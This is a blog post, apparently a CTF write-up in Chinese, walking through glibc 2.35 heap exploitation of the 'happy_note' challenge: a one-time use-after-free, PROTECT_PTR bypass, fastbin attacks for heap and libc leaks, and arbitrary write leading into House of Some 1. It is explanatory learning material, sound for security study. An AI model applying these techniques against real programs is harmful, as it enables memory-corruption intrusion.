<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN学习笔记vol.5 —— happy_note和House of Some 1 | Tover's Blog</title><meta name="keywords" content="writeup,PWN"><meta name="author" content="Tover. L"><meta name="copyright" content="Tover. L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="上次讲了House of Some 2，这次讲讲House of Some 1，然后换一道题，看看巅峰极客 2022的happy note.">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN学习笔记vol.5 —— happy_note和House of Some 1">
<meta property="og:url" content="https://tover.xyz/p/PWN-Note-5-happy-note-and-house-of-some-1/index.html">
<meta property="og:site_name" content="Tover&#39;s Blog">
<meta property="og:description" content="上次讲了House of Some 2，这次讲讲House of Some 1，然后换一道题，看看巅峰极客 2022的happy note.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tover.xyz/img/icon.jpg">
<meta property="article:published_time" content="2025-03-10T11:51:26.000Z">
<meta property="article:modified_time" content="2025-03-13T11:00:27.127Z">
<meta property="article:author" content="Tover. L">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tover.xyz/img/icon.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://tover.xyz/p/PWN-Note-5-happy-note-and-house-of-some-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN学习笔记vol.5 —— happy_note和House of Some 1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-13 19:00:27'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tover's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/icon.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tover's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN学习笔记vol.5 —— happy_note和House of Some 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-10T11:51:26.000Z" title="发表于 2025-03-10 19:51:26">2025-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-13T11:00:27.127Z" title="更新于 2025-03-13 19:00:27">2025-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>64分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN学习笔记vol.5 —— happy_note和House of Some 1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/p/PWN-Note-5-happy-note-and-house-of-some-1/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>上次讲了<code>House of Some 2</code>，这次讲讲<code>House of Some 1</code>，然后换一道题，看看巅峰极客 2022的<code>happy note</code></p>
<p>题目：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2567">https://www.nssctf.cn/problem/2567</a></p>
<p>调试的<code>libc</code>源码：<a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/libc/glibc-2.35.tar.gz">https://ftp.gnu.org/gnu/libc/glibc-2.35.tar.gz</a></p>
<p>题目用的<code>libc</code>：<a target="_blank" rel="noopener" href="https://libc.blukat.me/d/libc6_2.35-0ubuntu3_amd64.so">https://libc.blukat.me/d/libc6_2.35-0ubuntu3_amd64.so</a></p>
<h1 id="漏洞点">漏洞点<a class="anchor" href="#漏洞点">·</a></h1>
<p>先看<code>delete</code>，在<code>free</code>之后有对指针置<code>0</code>，防止了<code>uaf</code></p>
<p>但是在选择的时候输入<code>666</code>的话可以进入后门，能够触发<code>1</code>次的<code>uaf</code></p>
<img src="/p/PWN-Note-5-happy-note-and-house-of-some-1/image-20250310092536116.png" class="" title="img_">
<p>所以剩下的就要考虑怎么利用这仅有的一次<code>uaf</code>去打</p>
<p>再来看看<code>add</code>，有<code>12</code>个坑位，可以分配小于等于<code>0x210</code>的堆块，另外有两种模式：</p>
<ul>
<li>如果设置<code>mode = 1</code>，就采用<code>calloc</code>的方式来分配堆块，这个<code>mode</code>比较麻烦，首先用<code>calloc</code>的堆块在分配后会把其中的内容全部填为<code>\x00</code>，然后<code>calloc</code>并不会触发<code>tcache</code>机制，也就是它不会拿<code>tcachebin</code>的堆块</li>
<li>如果设置<code>mode = 2</code>，则采用熟悉的<code>malloc</code>进行堆块分配，但是这个<code>mode</code>只能选择<code>2</code>次</li>
</ul>
<p>最后，在<code>delete</code>里面有一个<code>exit</code>从<code>_IO_FILE</code>的角度看，就可以用<code>exit</code>链去打，当然在很多地方都有<code>puts</code>，所以也可以用<code>puts</code>链去打</p>
<img src="/p/PWN-Note-5-happy-note-and-house-of-some-1/image-20250310095618960.png" class="" title="img_">
<h1 id="攻击思路">攻击思路<a class="anchor" href="#攻击思路">·</a></h1>
<p>总结下来，难点就是，要用<code>1</code>次<code>uaf</code>、<code>2</code>次<code>malloc</code>和多次<code>calloc</code>去打<code>libc-2.35</code>的堆</p>
<h2 id="失败的攻击思路（NG）">失败的攻击思路（NG）<a class="anchor" href="#失败的攻击思路（NG）">·</a></h2>
<p>先来看一个失败的例子</p>
<p>这个例子的失败是因为我当时以为<code>calloc</code>和<code>malloc</code>的不同只在于会置<code>\x00</code>，而不知道不会触发<code>tcache</code></p>
<p>如果把<code>calloc</code>改成<code>malloc</code>加<code>memset</code>的话这个做法或许会成功</p>
<p>PS：没兴趣的可以直接跳过这一节</p>
<h3 id="Part-1-劫持tcache-perthread-struct">Part.1 劫持tcache_perthread_struct<a class="anchor" href="#Part-1-劫持tcache-perthread-struct">·</a></h3>
<p>为了突破限制，我首先想到的是可以像<a href="https://tover.xyz/p/PWN-Note-1-Tcache-and-Setcontext/#%E6%96%B9%E6%B3%95-2-%E5%88%A9%E7%94%A8tcache-perthread-struct">笔记vol.1</a>里说的，劫持<code>tcache_perthread_struct</code></p>
<p>劫持<code>tcache_perthread_struct</code>后，一个是可以修改<code>tcachebin</code>的<code>counts</code>为<code>7</code>，让下一个堆块直接被<code>free</code>到<code>unsorted</code>中，另一个是可以控制<code>entrices</code>，实现多次的任意地址写</p>
<p>为了劫持<code>tcache_perthread_struct</code>，可以利用<code>tcachebin</code>做攻击</p>
<p>首先<code>add</code>两个堆块<code>chunk0</code>和<code>chunk1</code>，然后用<code>delete</code>去删除<code>chunk1</code>，用后门去删除<code>chunk0</code>，就会在<code>tcachebin</code>上得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; chunk0 -&gt; chunk1 -&gt; NULL</span><br></pre></td></tr></table></figure>
<p>接着用<code>uaf</code>去把<code>chunk0</code>的<code>fd</code>指向<code>tcache_perthread_struct</code>，就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; chunk0 -&gt; tcache_perthread_struct -&gt; 0</span><br></pre></td></tr></table></figure>
<p>接着进行两次<code>add</code>（<code>mode = 2</code>）就可以把堆块分配到<code>tcache_perthread_struct</code></p>
<p>到这里有个问题是，<code>libc-2.35</code>上有<code>PROTECT_PTR</code>保护，在不知道<code>heap_base</code>的情况下，不能让<code>chunk0</code>的<code>fd</code>指向<code>tcache_perthread_struct</code></p>
<p>而这里也不能像<a href="https://tover.xyz/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/#%E9%82%A3%E4%B9%88%E8%AF%A5%E5%A6%82%E4%BD%95%E6%B3%84%E9%9C%B2">笔记vol.3</a>那样，直接分配<code>1</code>个堆块然后去泄露<code>heap_base</code>的<code>ASLR</code>，因为在<code>__libc_malloc</code>中调用<code>tcache_get</code>取<code>tcachebin</code>的堆块前，会有一句检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>所以也就需要有<code>2</code>个堆块，才能保证堆块能被分配到<code>tcache_perthread_struct</code></p>
<p>那么在不知道<code>heap_base</code>的情况下能不能搞呢，这里就有一个<code>trick</code></p>
<p>首先利用<code>uaf</code>可以从<code>chunk0</code>中泄露一个被<code>PROTECT_PTR</code>保护保护的堆地址，也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROTECT_PTR(&amp;chunk1) = ASLR ^ &amp;chunk1</span><br></pre></td></tr></table></figure>
<p>其中<code>chunk1</code>的地址是固定的，也就是已知的，假设<code>chunk1</code>和<code>tcache_perthread_struct</code>的<code>ASLR</code>相同的话（这个大概率相同，不同的话也可以绕一下），那么就可以对低<code>12</code>比特计算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  PROTECT_PTR(&amp;chunk1) ^ &amp;chunk1 ^ &amp;tcache_perthread_struct</span><br><span class="line">= ASLR ^ &amp;chunk1 ^ &amp;chunk1 ^ &amp;tcache_perthread_struct</span><br><span class="line">= ASLR ^ &amp;tcache_perthread_struct</span><br><span class="line">= PROTECT_PTR(&amp;tcache_perthread_struct)</span><br></pre></td></tr></table></figure>
<p>得到被<code>PROTECT_PTR</code>保护的<code>tcache_perthread_struct</code>地址</p>
<p>把这个地址写到<code>chunk0</code>的<code>fd</code>上就可以了</p>
<h3 id="Part-2-泄露heap-base">Part.2 泄露heap_base<a class="anchor" href="#Part-2-泄露heap-base">·</a></h3>
<p>理论上这样一番操作后就很难摸到上面的<code>chunk1</code>了，而<code>heap_base</code>的<code>ASLR</code>就在<code>chunk1</code>的<code>fd</code>上</p>
<p>那咋办呢，先来看看<code>tcache_perthread_struct</code>上是什么情况</p>
<p>复习一下，在分配<code>tcachebin</code>的堆块时，会调用的<code>tcache_get</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设这时有<code>e-&gt;next = 0</code>d的话，那么<code>tcache-&gt;entries[tc_idx]</code>上写的就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVEAL_PTR (e-&gt;next) = ASLR ^ <span class="number">0</span> = ASLR</span><br></pre></td></tr></table></figure>
<p>也就是在写<code>chunk0</code>的<code>fd</code>时，只要保证分配在<code>tcache_perthread_struct</code>上的堆块的<code>fd</code>为<code>0</code>，那么对应的<code>entrices</code>上就会有<code>heap_base</code>的<code>ASLR</code></p>
<p>剩下的问题就是怎么把这个<code>heap_base</code>的<code>ASLR</code>读出来，在<code>show</code>函数中是通过<code>%s</code>的<code>printf</code>输出，所以会有<code>\x00</code>截断</p>
<p>解决方法是，在前面填非<code>\x00</code>字符到需要读的位置，读出来后把填充的字符截掉就好了，比如我填字符<code>0</code></p>
<img src="/p/PWN-Note-5-happy-note-and-house-of-some-1/image-20250310141558594.png" class="" title="img_">
<h3 id="Part-3-泄露libc-base">Part.3 泄露libc_base<a class="anchor" href="#Part-3-泄露libc-base">·</a></h3>
<p>泄露完<code>heap_base</code>之后，需要恢复<code>tcache_perthread_struct</code>，不然后面的<code>tcache</code>机制会乱掉</p>
<p>恢复的时候可以顺便利用<code>tcache_perthread_struct</code>泄露<code>libc_base</code></p>
<p>还记得前面Part.1的时候在<code>tchchebin</code>上有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; chunk0 -&gt; tcache_perthread_struct -&gt; 0</span><br></pre></td></tr></table></figure>
<p>然后再<code>add</code>了两个堆块</p>
<p>假设这两个堆块叫<code>chunk2</code>和<code>chunk3</code>，那么<code>chunk3</code>就是<code>tcache_perthread_struct</code>上的那个堆块，而<code>chunk2</code>和<code>chunk0</code>其实是同一个堆块（因为<code>uaf</code>）</p>
<p>那么接下来如果把<code>chunk2</code>给<code>delete</code>到<code>unsortedbin</code>，那么就可以通过<code>chunk0</code>泄露<code>libc_base</code></p>
<p>现在已经劫持了<code>tcache_perthread_struct</code>，所以有一个快捷的方法是，把对应的<code>tcachebin</code>的<code>counts</code>填成<code>7</code>，那么就相当于把<code>tcachebin</code>填满了</p>
<p>这时把<code>chunk2</code>给<code>delete</code>就会落到<code>unsortedbin</code>中</p>
<h3 id="Part-4-然后呢">Part.4 然后呢<a class="anchor" href="#Part-4-然后呢">·</a></h3>
<p>然后我就想可以通过修改<code>tcache_perthread_struct</code>的<code>entrices</code>实现任意地址写</p>
<p>但是发现，<code>calloc</code>并不能触发<code>tcache</code>机制</p>
<p>而<code>2</code>次的<code>malloc</code>机会在上面已经用完了</p>
<p>然后就寄了</p>
<h2 id="成功的攻击思路">成功的攻击思路<a class="anchor" href="#成功的攻击思路">·</a></h2>
<p>到目前为止，有一个一直被我忽略的老东西，就是<code>fastbin</code></p>
<p>下面看看要怎么用<code>fastbin</code>搞</p>
<h3 id="Part-1-泄露heap-base">Part.1 泄露heap_base<a class="anchor" href="#Part-1-泄露heap-base">·</a></h3>
<p>先来总结一下，泄露堆上信息大概有三种方法</p>
<ol>
<li>利用<code>uaf</code>，在<code>free</code>后可以直接用<code>show</code>泄露</li>
<li>在<code>tcachebin</code>中（或者<code>fastbin</code>），用<code>mode = 2</code>的<code>malloc</code>分配堆块，就不会擦除除<code>e-&gt;key</code>以外的信息</li>
<li>利用<code>fastbin attack</code>构造堆块重叠，然后读重叠的内容，这个后面会用到，后面再细说</li>
</ol>
<p>在这里我用的是<code>uaf</code>的方法，因为我刚好需要对那个堆块进行<code>uaf</code></p>
<p>上面说了，需要用到<code>fastbin</code>，所以需要先分配<code>7</code>个<code>0x80</code>（或者以下）的堆块，然后再分配<code>1</code>个<code>0x80</code>的堆块，不妨把最后分配的这个堆块叫做<code>chunk11</code>（为了方便前面的<code>for</code>循环，所以我把这个堆块放到了最后）</p>
<p>接着把前面<code>7</code>个堆块<code>delete</code>掉，再利用后门把<code>chunk11</code>给<code>free</code>掉，这样因为<code>tcachebin</code>被填满了，所以<code>chunk11</code>就会落到<code>fastbin</code>中，形成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; chunk11 -&gt; NULL</span><br></pre></td></tr></table></figure>
<p>这时直接对<code>chunk11</code>进行<code>show</code>就可以泄露<code>heap_base</code>的<code>ASLR</code></p>
<p>PS：注意，<code>fastbin</code>和<code>tcachebin</code>用的同一套<code>PROTECT_PTR</code>机制</p>
<h3 id="Part-2-泄露libc-base">Part.2 泄露libc_base<a class="anchor" href="#Part-2-泄露libc-base">·</a></h3>
<p><code>libc_base</code>就有点复杂，大概就是用<code>fastbin attack</code>构造堆块重叠</p>
<p>首先跟Part.1的类似，先分配<code>8</code>个<code>0x210</code>的堆块（物理地址上是<code>chunk0</code> - <code>chunk7</code>），然后为了在尽量少分配堆块的情况下分割<code>top_chunk</code>，我先把<code>chunk7</code>给<code>delete</code>，然后依次<code>delete</code>掉<code>chunk0</code>到<code>chunk6</code>，那么<code>chunk6</code>就会落到<code>unsortedbin</code>上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebin    -&gt; chunk5 -&gt; ... ... -&gt; chunk0 -&gt; chunk7 -&gt; NULL </span><br><span class="line">unsortedbin &lt;-&gt; chunk6</span><br></pre></td></tr></table></figure>
<p>这样<code>chunk6</code>上就有了<code>libc</code>的地址，剩下的问题是怎么把这个地址泄露出来</p>
<p>在Part.1中，已经对<code>chunk11</code>做了一次<code>uaf</code>，那么接下来可以利用<code>uaf</code>把<code>chunk11</code>的<code>fd</code>指向<code>chunk6</code>的<code>fd</code>，然后把<code>chunk6</code>的<code>fd</code>读出来</p>
<p>PS：<code>fastbin</code>中没有<code>tcachebin</code>的<code>counts</code>机制，所以一个堆块也可以这样搞</p>
<p>理论是如此，但实际上是不行的，因为在<code>malloc.c:3857</code>的<code>_int_malloc</code>中有一句检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	idx = fastbin_index (nb);</span><br><span class="line">... ...</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>从结果上来说，就是分配到的地方要有一个合理的堆块头，而且头部中的<code>mchunk_size</code>要和<code>fastbin</code>中的大小对应</p>
<p>还记得<code>chunk5</code>是在<code>chunk6</code>的物理地址上方，那么解决方法就可以是，在<code>chunk5</code>中写上一个假的<code>fastbin</code>堆块，然后让<code>chunk11</code>的<code>fd</code>指向这个假的堆块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk11 -&gt; fake_chunk (in chunk5) -&gt; ??</span><br></pre></td></tr></table></figure>
<p>这样在进行两次<code>mode = 1</code>的<code>calloc</code>后，就可以把堆块分配到<code>fake_chunk</code>上</p>
<p>这里不妨令第一次分配的叫<code>chunk10</code>，第二次分配的叫<code>chunk9</code>，那么<code>chunk10</code>和<code>chunk11</code>其实就是同一个堆块，而<code>chunk9</code>就是<code>chunk5</code>里面的<code>fake_chunk</code></p>
<p>最后就是用<code>fake_chunk</code>（<code>chunk9</code>）怎么泄露<code>chunk6</code>中的<code>libc</code>地址</p>
<p>注意这里的<code>chunk9</code>是用<code>calloc</code>分配的，在分配后会把堆块中的内容置<code>\x00</code>，所以需要避免<code>chunk6</code>中的地址被擦除</p>
<p>另一个问题是<code>show</code>会被<code>\x00</code>截断，所以还要避免<code>chunk9</code>到<code>chunk6</code>的内容之间含有<code>\x00</code></p>
<p>解决方法可以是，在<code>add</code>时给一个<code>0x*8</code>的大小，比如我给一个<code>0x78</code>的大小，然后把<code>fake_chunk</code>的头写到<code>chunk6</code>的<code>bk</code>的前<code>0x78</code>的位置</p>
<p>这样操作后，只要把<code>chunk9</code>填上非<code>\x00</code>字符，那么<code>show</code>就会得到填充字符接上<code>chunk6</code>的<code>bk</code>，于是就可以泄露<code>libc_base</code></p>
<p>PS：<code>0x*8</code>是为了堆块的<code>16</code>字节对齐，另外因为<code>unsortedbin</code>是双链表，所以<code>bk</code>指针也会有<code>main_arena</code>的地址</p>
<img src="/p/PWN-Note-5-happy-note-and-house-of-some-1/1741594693500.png" class="" title="img_">
<h3 id="Part-3-构造任意写">Part.3 构造任意写<a class="anchor" href="#Part-3-构造任意写">·</a></h3>
<p>到目前还剩下<code>2</code>次<code>mode = 2</code>的<code>malloc</code>没有用，也就是还可以做一次<code>tcachebin attack</code></p>
<p>看看目前<code>tcachebin</code>的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcachebin -&gt; chunk5 -&gt; ... ... -&gt; chunk0 -&gt; chunk7 -&gt; NULL </span><br></pre></td></tr></table></figure>
<p>于是可以修改<code>chunk5</code>的<code>fd</code>，指向任意想要写的位置，然后进行<code>2</code>次<code>mode = 2</code>的<code>malloc</code></p>
<p>改<code>chunk5</code>的<code>fd</code>的方法也是<code>fastbin attack</code></p>
<p>注意在Part.2的操作后，<code>chunk10</code>和<code>chunk11</code>是同一个堆块</p>
<p>那么就可以先在<code>chunk4</code>写上假的堆块头，然后把<code>chunk10</code>给<code>delete</code>掉，用<code>chunk11</code>把<code>chunk10</code>的<code>fd</code>改到<code>chunk4</code>上的<code>fake_chunk</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk10 -&gt; fake_chunk (in chunk4) -&gt; ??</span><br></pre></td></tr></table></figure>
<p>最后进行两次<code>0x78</code>的<code>add</code>把堆块分配到<code>chunk4</code>的<code>fake_chunk</code>上</p>
<p>这里不妨假设第一次<code>add</code>的是<code>chunk10</code>（<code>delete</code>会置<code>0</code>，所以没毛病），第二次的是<code>chunk8</code></p>
<p>那么<code>chunk10</code>又是和<code>chunk11</code>是同一个堆块，<code>chunk8</code>是<code>chunk4</code>里面的<code>fake_chunk</code></p>
<p>而<code>fake_chunk</code>的头可以是<code>chunk5-&gt;key</code>前的<code>0x78</code>字节，这样的话甚至还不用泄露<code>tcache_key</code></p>
<img src="/p/PWN-Note-5-happy-note-and-house-of-some-1/1741596267427.png" class="" title="img_">
<h3 id="Part-4-House-of-Some-1">Part.4 House of Some 1<a class="anchor" href="#Part-4-House-of-Some-1">·</a></h3>
<p>最后的问题是，任意写应该写什么</p>
<p>这里可以写<code>0x200</code>个字节，而且也有<code>puts</code>，所以可以像<a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2/">笔记vol.4</a>那样去打<a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some-2/">House of Some 2</a></p>
<p>但这题有<code>exit</code>，所以可以用更方便的<a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some/">House of Some 1</a></p>
